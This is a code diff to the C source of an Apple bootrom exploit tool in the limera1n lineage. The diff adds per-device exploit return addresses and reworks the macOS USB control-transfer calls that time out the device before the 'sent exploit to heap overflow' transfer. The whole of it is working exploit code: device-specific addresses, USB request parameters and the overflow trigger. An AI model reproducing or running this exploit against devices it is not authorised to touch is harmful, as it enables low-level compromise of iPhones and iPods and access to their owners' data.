@@ -15,14 +15,20 @@
 
 #define LOADADDR	0x84000000
 // A4:
+#if defined(DEVICE_A4)
 #define EXPLOIT_LR	0x8403BF9C
 #define LOADADDR_SIZE	0x2C000
 // iPod 3G:
-//#define EXPLOIT_LR	0x84033F98
-//#define LOADADDR_SIZE	0x24000
+#elif defined(DEVICE_3G)
+#define EXPLOIT_LR	0x84033F98
+#define LOADADDR_SIZE	0x24000
 // iPhone 3Gs:
-//#define EXPLOIT_LR	0x84033FA4
-//#define LOADADDR_SIZE	0x24000
+#elif defined(DEVICE_3GS_NEW_BOOTROM)
+#define EXPLOIT_LR	0x84033FA4
+#define LOADADDR_SIZE	0x24000
+#else
+#error No device type specified!
+#endif
 
 #define VENDOR_ID    0x05AC
 #define WTF_MODE     0x1227
@@ -83,6 +89,7 @@ struct libusb_device_handle* usb_wait_device_connection(struct libusb_context* c
         sleep(2);
         usb_close(handle);
         handle = usb_init(context, WTF_MODE);
+        return handle;
 }
 
 int readfile(char *filename, void* buffer, unsigned int skip) {
@@ -150,21 +157,22 @@ int main(int argc, char *argv[]) {
 	#ifndef __APPLE__
 	printf("sent fake data to timeout: %X\n", libusb_control_transfer(handle, 0x21, 1, 0, 0, buf, 0x800, 10));
 	#else
+	#define DARWIN_CACHED_DEVICE(a) ((struct darwin_cached_device *) (((struct darwin_device_priv *)((a)->os_priv))->dev))
 	// pod2g: dirty hack for limera1n support.
 	IOReturn kresult;
-	IOUSBDevRequest req;
+	IOUSBDevRequestTO req;
 	bzero(&req, sizeof(req));
 	//struct darwin_device_handle_priv *priv = (struct darwin_device_handle_priv *)client->handle->os_priv;
-	struct darwin_device_priv *dpriv = (struct darwin_device_priv *)handle->dev->os_priv;
+	struct darwin_cached_device *dpriv = DARWIN_CACHED_DEVICE(handle->dev);
 	req.bmRequestType     = 0x21;
 	req.bRequest          = 1;
 	req.wValue            = OSSwapLittleToHostInt16 (0);
 	req.wIndex            = OSSwapLittleToHostInt16 (0);
 	req.wLength           = OSSwapLittleToHostInt16 (0x800);
 	req.pData             = buf + LIBUSB_CONTROL_SETUP_SIZE;
-	kresult = (*(dpriv->device))->DeviceRequestAsync(dpriv->device, &req, (IOAsyncCallback1) dummy_callback, NULL);
+	kresult = (*(dpriv->device))->DeviceRequestAsyncTO(dpriv->device, &req, (IOAsyncCallback1) dummy_callback, NULL);
 	usleep(5 * 1000);
-	kresult = (*(dpriv->device))->USBDeviceAbortPipeZero (dpriv->device);
+	kresult = (*(dpriv->device))->USBDeviceAbortPipeZero(dpriv->device);
 	#endif
 	
 	printf("sent exploit to heap overflow: %X\n", libusb_control_transfer(handle, 0x21, 2, 0, 0, buf, 0, 1000));
